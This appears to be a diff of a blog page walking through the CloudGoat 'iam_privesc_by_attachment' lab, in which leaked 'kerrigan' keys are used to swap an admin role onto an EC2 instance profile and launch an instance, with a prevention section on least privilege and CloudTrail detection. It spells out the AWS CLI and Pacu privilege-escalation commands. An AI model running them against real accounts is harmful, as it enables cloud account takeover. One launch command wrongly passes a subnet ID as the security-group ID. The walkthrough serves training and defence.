-<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>aws iam get-policy-version --policy-arn<span style=color:#2c5dcd>=</span>arn:aws:iam:::policy/cg-ec2-mighty-policy --version-id<span style=color:#2c5dcd>=</span>v1
-</code></pre></td></tr></table>
-</div>
-</div><p><img src=images/policy.png alt=policy class=img-fluid></p>
-<p>The output shows that we can take any action Action: * and we can access any resource Resource: *. Through this ec2 instance with the mighty role we are effectivly and administrator within this account. We can do anything that we would like.</p>
-<hr>
-<h3 id=prevention>Prevention</h3>
-<p>So, how do we prevent this. Where did the owner of this account go wrong? There are a few places where this could have be stopped. Lets dive into them.</p>
-<ol>
-<li>The first and probably the biggest is does the Kerrigan user need a static key? If they could be switched to temorary ephemeral keys it would greatly reduce the liklihood that if an attacker found the keys that they would still be valid. In this scenario specifically if we did not have the Kerrigan access key then this attack would have failed right out of gate.</li>
-<li>Does Kerrigan need this level of access? Looking at the policy:</li>
-</ol>
-<div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
-<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">30
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">31
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">32
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">33
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">34
-</span></code></pre></td>
-<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json>{
- <span style=color:#2c5dcd;font-weight:700>&#34;Version&#34;</span>: <span style=color:#0c6>&#34;2012-10-17&#34;</span>,
- <span style=color:#2c5dcd;font-weight:700>&#34;Statement&#34;</span>: [
-  {
-   <span style=color:#2c5dcd;font-weight:700>&#34;Sid&#34;</span>: <span style=color:#0c6>&#34;VisualEditor0&#34;</span>,
-   <span style=color:#2c5dcd;font-weight:700>&#34;Effect&#34;</span>: <span style=color:#0c6>&#34;Allow&#34;</span>,
-   <span style=color:#2c5dcd;font-weight:700>&#34;Action&#34;</span>: [
-    <span style=color:#0c6>&#34;iam:ListRoles&#34;</span>,
-    <span style=color:#0c6>&#34;iam:PassRole&#34;</span>,
-    <span style=color:#0c6>&#34;iam:ListInstanceProfiles&#34;</span>,
-    <span style=color:#0c6>&#34;iam:AddRoleToInstanceProfile&#34;</span>,
-    <span style=color:#0c6>&#34;iam:RemoveRoleFromInstanceProfile&#34;</span>,
-    <span style=color:#0c6>&#34;ec2:AssociateIamInstanceProfile&#34;</span>,
-    <span style=color:#0c6>&#34;ec2:DescribeIamInstanceProfileAssociations&#34;</span>,
-    <span style=color:#0c6>&#34;ec2:RunInstances&#34;</span>
-   ],
-   <span style=color:#2c5dcd;font-weight:700>&#34;Resource&#34;</span>: <span style=color:#0c6>&#34;*&#34;</span>
-  },
-  {
-   <span style=color:#2c5dcd;font-weight:700>&#34;Sid&#34;</span>: <span style=color:#0c6>&#34;VisualEditor1&#34;</span>,
-   <span style=color:#2c5dcd;font-weight:700>&#34;Effect&#34;</span>: <span style=color:#0c6>&#34;Allow&#34;</span>,
-   <span style=color:#2c5dcd;font-weight:700>&#34;Action&#34;</span>: <span style=color:#0c6>&#34;ec2:CreateKeyPair&#34;</span>,
-   <span style=color:#2c5dcd;font-weight:700>&#34;Resource&#34;</span>: <span style=color:#0c6>&#34;*&#34;</span>
-  },
-  {
-   <span style=color:#2c5dcd;font-weight:700>&#34;Action&#34;</span>: [
-    <span style=color:#0c6>&#34;ec2:DescribeInstances&#34;</span>,<span style=color:#0c6>&#34;ec2:DescribeVpcs&#34;</span>, <span style=color:#0c6>&#34;ec2:DescribeSubnets&#34;</span>,
-    <span style=color:#0c6>&#34;ec2:DescribeSecurityGroups&#34;</span>
-   ],
-  <span style=color:#2c5dcd;font-weight:700>&#34;Effect&#34;</span>: <span style=color:#0c6>&#34;Allow&#34;</span>,
-  <span style=color:#2c5dcd;font-weight:700>&#34;Resource&#34;</span>: <span style=color:#0c6>&#34;*&#34;</span>
-  }
-  ]
-}
-</code></pre></td></tr></table>
-</div>
-</div><p>This policy grants a lot of access, and a lot of it probably isnt necessary. The iam permissions could probably go away. But, perhaps they&rsquo;re needed for an automation. What if the kerrigan keys are designed to spin up Ec2 instances, each has there own unique ssh key, and each need to have the same Instance profile associated with it so that it can access S3. If thats the case some of these permissions make sense. But we could still remove <code>ListRoles, PassRole, ListInstanceProfiles, RemoveRoleFromInstanceProfile, DescribeiamInstanceProfileAssociations</code>. These permissions were critical for us to be able to pivot from Kerrigan to an instance with mighty permissions.</p>
-<ol start=3>
-<li>The mighty role should probably just not exist at all. This would be an interesting discussion with the stakeholders to understand the purpose of this role. Perhaps there is a valid reason for it, but more than likely this could have permissions scoped in and not given full administrative rights to the account.</li>
-<li>Proper detections could also help. While they might not prevent the entire attack, they may help to slow everything down. If the Cloudtrail logs were baselined, and examined our activities would probably stick out. Our enumeration was very loud, we made hundereds of calls over a short period of time. Additionally we probably made calls that the Kerrigan never makes. This would allow a SOC to have a heads up of the malicious activity and begin investigating.</li>
-</ol>
-</div>
-</div>
-<div class=col-md-3 id=sidebar data-spy=affix-bottom data-offset-top=0>
-<nav class="post-sidebar hidden-print hidden-sm hidden-xs affix sticky" id=post-nav>
-<h5>contents</h5>
-<ul class="nav post-sidenav">
-<li><nav id=TableOfContents>
-<ul>
-<li><a href=#whoami>whoami</a>
-<ul>
-<li><a href=#what-can-i-do>What can I do?</a></li>
-<li><a href=#more-enumeration>More Enumeration</a></li>
-<li><a href=#make-an-ec2>Make an ec2</a></li>
-<li><a href=#more-power>More Power</a></li>
-<li><a href=#prevention>Prevention</a></li>
-</ul>
-</li>
-</ul>
-</nav></li>
-</ul>
-</nav>
-</div>
-</div>
-</div>
-</div>
-<footer>
-</footer>
-</body>
-<script src=https://code.jquery.com/jquery-3.3.1.slim.min.js integrity=sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo crossorigin=anonymous></script>
+<!doctype html><html lang=en><head><script async src="https://www.googletagmanager.com/gtag/js?id=UA-133811886-2"></script>
+<script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","UA-133811886-2")</script><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=x-ua-compatible content="IE=edge"><script src=/js/nav.js></script>
+<link rel="shortcut icon" href=/favicon.ico><link rel=stylesheet href=https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css integrity=sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T crossorigin=anonymous><link rel=stylesheet href=/css/main.css><title>iam_privesc_by_attachment | jellyparks</title></head><body><header></header><div class=site-wrapper><div class="sticky top-bar"><div id=mySidenav class=sidenav include-nav=/nav.html></div><span class="sticky hamburger" style=font-size:30px;cursor:pointer onclick=openNav()>&#9776;</span></div><div class=container><div class=blog-header><h1>iam_privesc_by_attachment</h1></div><div class=row><div class="col-sm-8 blog-main"><div class=blog-post><hr><p>Once the scenario is creation process completes we are presented with a set of access keys for a user account &lsquo;kerrigan&rsquo;</p><p><img src=images/initial-user.png alt="Initial User" class=img-fluid></p><hr><h2 id=whoami>whoami</h2><p>First lets make sure the credentials that we have obtained are valid:</p><div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>aws sts get-caller-identity --profile xxx |jq
+</span></span></code></pre></td></tr></table></div></div><p><img src=images/whoami.png alt=whoami class=img-fluid></p><p>Perfect, looks like the credentials work. Now, what can they do?</p><hr><h3 id=what-can-i-do>What can I do?</h3><p>Lets use pacu to brute force some permissions. We can do this by running:</p><div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>run iam__bruteforce_permissions
+</span></span></code></pre></td></tr></table></div></div><p><img src=images/brute-force-perms.png alt=brute_force class=img-fluid></p><p>Once the command completes we see the output below:</p><p><img src=images/brute-force-output.png alt=brute_force_output class=img-fluid></p><p>Overall the credentials are fairly limited. But it does look like we have the ability to learn about ec2 instances with the describe command. Lets bounce back to the aws cli and run:</p><div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>aws ec2 describe-instances |jq
+</span></span></code></pre></td></tr></table></div></div><p>We get an output thatshows us details about the instances within the us-east region of this account. Lets clean this up a little bit just for fun.</p><div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>aws --profile kerrigan ec2 describe-instances |jq -r <span style=color:#0c6>&#39;.Reservations[0].Instances[].InstanceId,.Reservations[0].Instances[].SecurityGroups[].GroupName,.Reservations[0].Instances[].NetworkInterfaces[].Association[]&#39;</span>
+</span></span></code></pre></td></tr></table></div></div><p>*<em>Note in the command above I set the Reservations to the value in the first index. To see all instances leave the brackets empty &lsquo;[]&rsquo;</em></p><p>This cleans up the verbose output and prints the instance id, security groups, and some networking details about the instance</p><p><img src=images/jq-fun.png alt=jq_fun class=img-fluid></p><p>Lets see what else our permissions can do. We&rsquo;ll start with the instance profiles command. According to Pacu we have rights to invoke this command.</p><div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>aws iam list-instance-profiles |jq
+</span></span></code></pre></td></tr></table></div></div><p>Looking at the output below we see a profile with the &lsquo;cg-ec2-meek-role&rsquo; associated with it.</p><p><img src=images/iam-list-profiles.png alt=iam_list_profiles class=img-fluid></p><p>Lets use pacu to see what instances,security groups, vpcs, and subnets exist within the environment:</p><div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>run ec2__enum --region<span style=color:#2c5dcd>=</span>us-east-1
+</span></span></code></pre></td></tr></table></div></div><p>Looking at the output we can see that there are currently 4 instances in the region as well as additional information that may become useful.</p><p><img src=images/ec2-enum.png alt=ec2_enum class=img-fluid></p><p>Within Pacu running the <code>data</code> command will dump all of the data from the current session. This will include all of the details we just enumerated about the EC2&rsquo;s within the account.</p><p>Lets head back to the aws cli and run the ec2 describe call again. This time instead of jq we will just print the output to a table.</p><div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>aws --profile kerrigan ec2 describe-instances --output table
+</span></span></code></pre></td></tr></table></div></div><p>Looking at the output we can see that there is an ec2 and one of the <code>tags</code> is that it is a <code>super critical server</code>.</p><p><img src=images/super-critical-tag.png alt=critical_ec2_enum class=img-fluid></p><hr><h3 id=more-enumeration>More Enumeration</h3><p>Considering everything that we&rsquo;ve seen up to this point:</p><ul><li>A critical instance exists</li><li>We can perform several ec2 tasks</li><li>We do have some limited iam rights</li></ul><p>There seems to be some potential for us to create an instance. Lets use Pacu to see if we have any additional iam permissions that could be of use.</p><div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>run iam__enum_users_roles_policies_groups
+</span></span></code></pre></td></tr></table></div></div><p>In the output below it looks like we do not have permissions to make the: <code>list_users, list_groups, or list_policies calls</code>. We do however have permissions to list roles within the account.</p><p><img src=images/iam-permission-failure.png alt=iam_enum class=img-fluid></p><p>Lets dig into those a big more. This can be done by either running the <code>data</code> command from within Pacu or by running the following command via the aws cli:</p><div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>aws --profile kerrigan iam list-roles | jq <span style=color:#0c6>&#39;.Roles[].RoleName&#39;</span>
+</span></span></code></pre></td></tr></table></div></div><p><img src=images/account-iam-roles.png alt=iam_roles class=img-fluid></p><p>Considering the role we saw associated with the ec2 instance earlier was called <code>meek</code> it&rsquo;s interesting to see another role with the name of <code>mightly</code>. Lets dig into that a bit more. Instead of making another <code>iam list-role</code>s call to AWS, lets just use the existing <code>data</code> within Pacu by running the data command.</p><p><img src=images/mighty-role.png alt=mighty_role class=img-fluid></p><p>In the picture above we can see that the <code>mighty</code> role is a role associated with the ec2 service. This is a role that can be associated with an ec2 profile, and the profile can be associated with an ec2 instance.</p><p>Considering we have permissions into describing instalnce profile associates, perhaps we also have the ability to associate different roles to a profile. Lets see if we can attach the mighty role to the ec2 profile</p><p>Only one role can be associated with an ec2 instance profile at a time. To begin we will see if we can remove the existing meek role from the profile. We need to pieces of information in order to remove a role from an instance profile. The role name we want to remove, and the profile we want to remove it from. Luckily we know both of those bits of information from our enumeration.</p><ul><li>Role: cg-ec2-meek-role-cgidawtm15fqxm</li><li>Profile: cg-ec2-meek-instance-profile-cgidawtm15fqxm</li></ul><pre tabindex=0><code>aws --profile kerrigan iam remove-role-from-instance-profile --instance-profile-name=cg-ec2-meek-instance-profile-cgidawtm15fqxm --role-name=cg-ec2-meek-role-cgidawtm15fqxm
+</code></pre><p>If the command is successful, there will be no output, if it fails, it squawks. We can confirm it as successful by running the list-instance-profiles command again.</p><p><img src=images/instance-profile-no-role.png alt=no_role class=img-fluid></p><p>In the output above we see the <code>meek</code> instance profile with no roles associated with it. Great! Now lets try associating the <code>mighty</code> role with the <code>meek</code> instance profile. In order to do this we need two pieces of information, the role name, and the instance profile name.</p><ul><li>Role: cg-ec2-mighty-role-cgidawtm15fqxm</li><li>Profile: cg-ec2-meek-instance-profile-cgidawtm15fqxm</li></ul><pre tabindex=0><code>aws --profile kerrigan iam add-role-to-instance-profile --instance-profile-name=cg-ec2-meek-instance-profile-cgidawtm15fqxm --role-name=cg-ec2-mighty-role-cgidawtm15fqxm
+</code></pre><p>Similar to the output when we removed the role from the profile, there will be no output if successful. However running the <code>list-instance-profiles</code> command again we can see that the <code>mighty</code> role has been associated with the <code>meek</code> instance profile.</p><p><img src=images/meek-profile-mighty-role.png alt=no_role class=img-fluid></p><p>Perfect! We now have the mighty role associated with the meek profile.</p><hr><h3 id=make-an-ec2>Make an ec2</h3><p>Lets create our own ec2 and see if we can associate the meek instance profile with the now might role attached to an ec2 instance that we can gain access to. In order to create an ec2 we need several pieces of information:</p><ul><li>ssh key</li><li>security group ids</li><li>subnet id</li><li>image-id</li><li>instance-type</li></ul><p>First we need a key pair the command below will create the ssh key named <code>totes-legit</code>, parses it with jq to just show the key details, and then sends the output into a file called totes-legit:</p><div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>aws --profile kerrigan ec2 create-key-pair --key-name totes-legit |jq -r <span style=color:#0c6>&#39;.KeyMaterial&#39;</span> &gt; ~/.ssh/totes-legit
+</span></span></code></pre></td></tr></table></div></div><p>Next we need to find a security group that fits our needs, or see if we can build our own. After all what use is an instane if we cannot connect to it. We can use data from Pacu or we can make another call to aws</p><div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>aws --profile kerrigan ec2 describe-security-groups
+</span></span></code></pre></td></tr></table></div></div><p>Looking at the output we can see that there is already a group that fits our needs, it allows SSH from an IP address that we have access to.</p><p><img src=images/ssh-security-group.png alt=security_group class=img-fluid></p><p>We know that the super critical server has a public IP address, we also have the subnet for that instance. We can use that subnet-id when we create our new instance.</p><p><img src=images/ec2-subnet.png alt=ec2_subnet class=img-fluid></p><p>At this point We have all of the pieces that we need to create an instance that we will have access to (hopefully).</p><ul><li>ssh key: totes-legit</li><li>security group ids: sg-0594794cf09e47456</li><li>subnet id: subnet-0157cfe78e8beca7a</li><li>image-id: ami-0a313d6098716f372</li><li>instance-type: t2.micro</li><li>Time to create an instance:</li></ul><div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>aws --profile kerrigan ec2 run-instances --image-id<span style=color:#2c5dcd>=</span>ami-0a313d6098716f372 --count<span style=color:#2c5dcd>=</span><span style=color:#5918bb;font-weight:700>1</span> --instance-type<span style=color:#2c5dcd>=</span>t2.micro --security-group-ids<span style=color:#2c5dcd>=</span>subnet-01a29bf90aca8c8d9 --subnet-id<span style=color:#2c5dcd>=</span>subnet-0157cfe78e8beca7a --key-name<span style=color:#2c5dcd>=</span>totes-legit --tags Key<span style=color:#2c5dcd>=</span>Name,Value<span style=color:#2c5dcd>=</span>totes-legit
+</span></span></code></pre></td></tr></table></div></div><p>When this is successful all of the data bout our instance is returned. This includes our instance id, ip information, and current state. and returns our instance id.</p><div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#0c6>&#34;InstanceId&#34;</span>: <span style=color:#0c6>&#34;i-06f3f5f9f8cdc9c6e&#34;</span>
+</span></span></code></pre></td></tr></table></div></div><p><img src=images/instance-provisioning.png alt=ec2_provision class=img-fluid></p><p>Unfortunatly, we don&rsquo;t seem to have a public IP address for our instance. Did something go wrong? Nope, the current stat of the instance was &lsquo;pending&rsquo;. We need to check back in on the instance an wait for the state to change to &lsquo;running&rsquo;. Once its running, we should also have public IP address information. We can do this with the <code>describe-instances</code> command.</p><div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>aws --profile kerrigan ec2 describe-instances --instance-id<span style=color:#2c5dcd>=</span>i-06f3f5f9f8cdc9c6e
+</span></span></code></pre></td></tr></table></div></div><p><img src=images/ec2-running.png alt=ec2_running class=img-fluid></p><p>The output from the command in the picture above shows that the instance is &lsquo;running&rsquo; and that we have a public IP.</p><div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#0c6>&#34;PublicIpAddress&#34;</span>: <span style=color:#0c6>&#34;18.232.65.212&#34;</span>
+</span></span></code></pre></td></tr></table></div></div><p>Now we can ssh into the box using our totes-legit key:</p><div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
